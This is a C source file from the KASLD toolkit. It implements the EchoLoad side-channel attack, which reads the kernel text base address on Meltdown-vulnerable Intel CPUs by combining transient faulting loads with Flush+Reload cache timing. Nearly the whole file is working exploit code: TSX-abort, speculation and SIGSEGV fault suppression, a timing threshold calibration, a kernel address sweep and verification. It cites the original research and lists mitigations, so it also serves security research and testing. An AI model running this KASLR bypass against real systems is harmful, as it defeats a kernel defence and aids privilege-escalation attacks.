// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EchoLoad side-channel KASLR bypass.
//
// Exploits the fact that on Meltdown-vulnerable Intel CPUs, a faulting
// load to a kernel address returns zero (rather than stalling) when the
// permission check fails. By encoding that zero into a Flush+Reload
// probe array, we can distinguish mapped kernel pages from unmapped ones:
// mapped pages return zero (cache hit on probe[0]); unmapped pages stall
// and produce no cache fill.
//
// Three transient execution modes are supported (compile-time selection):
//   - TSX abort:     Most reliable. Requires CPUID RTM bit (Intel TSX).
//   - Speculation:   Uses misspeculation via ret-to-call gadget. Works
//                    without TSX but slower and noisier, especially in VMs.
//   - Signal handler: Uses SIGSEGV + setjmp/longjmp. Fallback.
//
// The attack probes the 1 GiB kernel text window in 2 MiB steps. On
// vulnerable hardware with KPTI enabled, the lowest confirmed address is
// typically __entry_text_start; with KPTI disabled, it is _stext.
//
// On non-vulnerable hardware (AMD CPUs, modern Intel with in-silicon
// Meltdown fix), the transient load stalls rather than returning zero,
// so no cache line is filled and no result is produced. The component
// exits cleanly with no output — no false positives.
//
// Technique by Claudio Canella, Michael Schwarz, Martin Haubenwallner,
// Martin Schwarzl, and Daniel Gruss:
// "KASLR: Break It, Fix It, Repeat" (Asia CCS 2020)
//
// Leak primitive:
//   Data leaked:      kernel text virtual base address
//   Kernel subsystem: arch/x86 — Meltdown zero-return transient execution
//   Data structure:   kernel text mapping (faulting load returns zero)
//   Address type:     virtual (kernel text)
//   Method:           timing (Flush+Reload on probe array)
//   Status:           unfixed on Meltdown-vulnerable hardware
//
// Mitigations:
//   Non-Meltdown hardware (all AMD CPUs, Intel Ice Lake+) is immune —
//   the transient load stalls instead of returning zero. TSX disabled
//   (microcode or CONFIG_X86_INTEL_TSX_MODE_OFF) blocks the most
//   reliable mode but signal-handler mode still works. KPTI does not
//   fully mitigate (zero-return still distinguishes mapped vs unmapped).
//
// References:
// https://cc0x1f.net/publications/kaslr.pdf
// https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
// https://i.blackhat.com/asia-20/Friday/asia-20-Canella-Store-To-Leak-Forwarding-There-And-Back-Again-wp.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <cpuid.h>
#include <memory.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* =========================================================================
 * Configuration
 * =========================================================================
 */

/* Transient execution mode (select exactly one).
 *
 * TSX abort mode is the default. Falls back to signal handler mode if
 * the CPU lacks RTM support, so it is safe to leave TSX enabled.
 */
#define ECHOLOAD_USE_TSX 1
#define ECHOLOAD_USE_SPECULATION 0
#define ECHOLOAD_USE_SIGNAL 0

/* Number of interleaved iterations over the full scan window. Each
 * address is probed once per iteration, and cache hits are accumulated.
 *
 * Uses the same statistical approach as entrybleed: many interleaved
 * iterations to smooth noise, followed by unanimity verification.
 * Flush+Reload is self-resetting (clflush at the end of each probe),
 * so repeated iterations do not accumulate cache state. */
#define ECHOLOAD_ITERATIONS 100
#define ECHOLOAD_WARMUP 5

/* Minimum number of cache hits (out of ECHOLOAD_ITERATIONS) for an
 * address to be considered mapped. On Meltdown-vulnerable CPUs, mapped
 * kernel pages typically produce hit rates of 80-100%; noise on
 * non-vulnerable CPUs produces <5%. */
#define ECHOLOAD_HIT_THRESHOLD 50

/* Number of verification sweeps. The initial sweep result must match
 * all verification sweeps exactly (entrybleed-style unanimity check). */
#define ECHOLOAD_VERIFY 3

/* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
#define SCAN_STEP (KERNEL_ALIGN)
#define SCAN_SLOTS                                                             \
  ((unsigned long)(KERNEL_BASE_MAX - KERNEL_BASE_MIN) / SCAN_STEP)

KASLD_EXPLAIN("EchoLoad exploits the Meltdown vulnerability's zero-return "
              "behavior: on affected Intel CPUs, a speculative kernel memory "
              "read that faults returns zero to the transient execution path, "
              "but only for mapped pages. By using Flush+Reload to detect "
              "whether the speculative load produced a zero byte, the attack "
              "distinguishes mapped from unmapped kernel pages, revealing the "
              "KASLR text base. Requires Meltdown-vulnerable hardware (pre-Ice "
              "Lake Intel);.");

KASLD_META("method:timing\n"
           "addr:virtual\n"
           "hardware:Meltdown-vulnerable CPU required\n");

/* =========================================================================
 * Timing primitives (x86_64 only)
 *
 * Based on cacheutils.h by Daniel Gruss and Michael Schwarz (IAIK,
 * TU Graz / isec-tugraz). Original primitives (rdtsc, flush, reload):
 *   https://github.com/isec-tugraz/prefetch (Gruss, 2015)
 * Extended with TSX and signal-based fault suppression:
 *   https://github.com/isec-tugraz/ZombieLoad (Schwarz)
 * Used in the EchoLoad / Data Bounce reference implementation:
 *   https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
 * =========================================================================
 */

static size_t cache_miss_threshold;

static inline uint64_t rdtscp_time(void) {
  uint64_t lo, hi;
  __asm__ volatile("mfence\n\t"
                   "rdtscp\n\t"
                   "mov %%rax, %0\n\t"
                   "mov %%rdx, %1\n\t"
                   "mfence"
                   : "=r"(lo), "=r"(hi)
                   :
                   : "rax", "rcx", "rdx");
  return (hi << 32) | lo;
}

static inline void maccess(volatile void *p) {
  __asm__ volatile("movq (%0), %%rax" : : "c"(p) : "rax");
}

static inline void flush(volatile void *p) {
  __asm__ volatile("clflush 0(%0)" : : "c"(p) : "rax");
}

static int flush_reload(volatile void *ptr) {
  uint64_t start, end;
  start = rdtscp_time();
  maccess(ptr);
  end = rdtscp_time();
  flush(ptr);
  return (end - start) < cache_miss_threshold;
}

static size_t detect_flush_reload_threshold(void) {
  size_t reload_time = 0, flush_reload_time = 0;
  const size_t count = 1000000;
  size_t dummy[16];
  volatile size_t *ptr = dummy + 8;

  maccess((volatile void *)ptr);
  for (size_t i = 0; i < count; i++) {
    uint64_t s = rdtscp_time();
    maccess((volatile void *)ptr);
    uint64_t e = rdtscp_time();
    reload_time += (size_t)(e - s);
  }
  for (size_t i = 0; i < count; i++) {
    flush((volatile void *)ptr);
    uint64_t s = rdtscp_time();
    maccess((volatile void *)ptr);
    uint64_t e = rdtscp_time();
    flush_reload_time += (size_t)(e - s);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

/* =========================================================================
 * Fault suppression
 * =========================================================================
 */

/* --- Signal-based (SIGSEGV + longjmp) --- */
static jmp_buf trycatch_buf;

static void segfault_handler(int signum) {
  (void)signum;
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, SIGSEGV);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  longjmp(trycatch_buf, 1);
}

/* --- TSX (RTM) --- */
static int has_rtm(void) {
  unsigned int eax, ebx, ecx, edx;
  if (__get_cpuid_max(0, NULL) >= 7) {
    __cpuid_count(7, 0, eax, ebx, ecx, edx);
    return (ebx >> 11) & 1;
  }
  return 0;
}

static inline unsigned int xbegin_wrapper(void) {
  unsigned int status;
  __asm__ volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                   : "=a"(status)
                   : "a"(-1UL)
                   : "memory");
  return status;
}

static inline void xend_wrapper(void) {
  __asm__ volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
}

/* --- Speculation (ret-to-call mispredict) --- */
#if ECHOLOAD_USE_SPECULATION
#define speculation_start(label) __asm__ goto("call %l0" : : : : label##_retp)
#define speculation_end(label)                                                 \
  __asm__ goto("jmp %l0" : : : : label);                                       \
  label##_retp                                                                 \
      : __asm__ goto("lea %l0(%%rip), %%rax\n\tmovq %%rax, (%%rsp)\n\tret"     \
                     :                                                         \
                     :                                                         \
                     : "rax"                                                   \
                     : label);                                                 \
  label:                                                                       \
  __asm__ volatile("nop")
#endif

/* =========================================================================
 * CPU detection
 * =========================================================================
 */

static bool is_intel_cpu(void) {
  unsigned int eax, ebx, ecx, edx;
  __asm__ volatile("cpuid"
                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                   : "a"(0)
                   :);
  /* "GenuineIntel" = EBX:EDX:ECX */
  return ebx == 0x756e6547 && edx == 0x49656e69 && ecx == 0x6c65746e;
}

static bool detect_kpti(void) {
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return false;

  char *line = NULL;
  size_t len = 0;
  bool pti = false;
  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = true;
      break;
    }
  }
  free(line);
  fclose(f);
  return pti;
}

/* =========================================================================
 * Probe array (Flush+Reload target)
 * =========================================================================
 */

static char __attribute__((aligned(4096))) probe[4096 * 256];

/* =========================================================================
 * EchoLoad single sweep
 * =========================================================================
 *
 * Scans [KERNEL_BASE_MIN, KERNEL_BASE_MAX) and returns the lowest
 * confirmed mapped address, or 0 if nothing was found.
 *
 * Uses interleaved iteration: visit every candidate address once per
 * iteration, repeat ECHOLOAD_ITERATIONS times, and accumulate per-slot
 * hit counts. This avoids branch predictor training from repeated
 * sequential probes at the same address.
 */
static unsigned long echoload_sweep(int use_tsx) {
  int hits[SCAN_SLOTS];
  memset(hits, 0, sizeof(hits));

  for (int iter = 0; iter < ECHOLOAD_ITERATIONS + ECHOLOAD_WARMUP; iter++) {
    volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;

    for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
      flush(probe);

      if (use_tsx) {
        /* TSX abort mode */
        if (xbegin_wrapper() == ~0u) {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
          xend_wrapper();
        }
      }
#if ECHOLOAD_USE_SPECULATION
      else {
        /* Speculation mode */
        speculation_start(s);
        {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
        }
        speculation_end(s);
      }
#else
      else {
        /* Signal handler mode */
        if (!setjmp(trycatch_buf)) {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
        }
      }
#endif

      if (iter >= ECHOLOAD_WARMUP && flush_reload(probe))
        hits[slot]++;

      buffer += SCAN_STEP;
    }
  }

  /* Return the lowest address above the hit threshold */
  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
    if (hits[slot] >= ECHOLOAD_HIT_THRESHOLD)
      return KERNEL_BASE_MIN + slot * SCAN_STEP;
  }
  return 0;
}

/* =========================================================================
 * main
 * =========================================================================
 */
int main(void) {
  if (!getenv("KASLD_EXPERIMENTAL")) {
    fprintf(stderr, "[-] echoload: experimental component; "
                    "set KASLD_EXPERIMENTAL=1 to enable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!is_intel_cpu()) {
    fprintf(stderr, "[-] echoload: not an Intel CPU; attack not applicable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  int use_tsx;

#if ECHOLOAD_USE_TSX
  use_tsx = has_rtm();
  if (use_tsx) {
    fprintf(stderr, "[.] echoload: using TSX abort mode\n");
  } else {
    fprintf(stderr,
            "[.] echoload: TSX not available, falling back to %s mode\n",
#if ECHOLOAD_USE_SPECULATION
            "speculation"
#else
            "signal handler"
#endif
    );
  }
#else
  use_tsx = 0;
  fprintf(stderr, "[.] echoload: using %s mode\n",
#if ECHOLOAD_USE_SPECULATION
          "speculation"
#else
          "signal handler"
#endif
  );
#endif

  if (!use_tsx) {
    signal(SIGSEGV, segfault_handler);
  }

  memset(probe, 1, sizeof(probe));

  cache_miss_threshold = detect_flush_reload_threshold();
  fprintf(stderr, "[.] echoload: cache miss threshold: %zu cycles\n",
          cache_miss_threshold);

  /* Pin to a single core to reduce noise */
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(1, &set);
  sched_setaffinity(0, sizeof(set), &set);

  unsigned long addr = echoload_sweep(use_tsx);

  if (!addr) {
    fprintf(stderr, "[-] echoload: no kernel mapping detected "
                    "(CPU may not be vulnerable)\n");
    return 0;
  }

  /* Unanimity verification: repeat the full sweep and require every result to
   * match. If any sweep disagrees, the result is rejected entirely. */
  for (int v = 0; v < ECHOLOAD_VERIFY; v++) {
    if (addr != echoload_sweep(use_tsx)) {
      fprintf(stderr, "[-] echoload: inconsistent results. Aborting ...\n");
      return 0;
    }
  }

  bool pti = detect_kpti();
  const char *label =
      pti ? "echoload [__entry_text_start]" : "echoload [_stext]";

  fprintf(stderr, "[+] echoload: %s = 0x%016lx\n", label, addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, label);

  return 0;
}
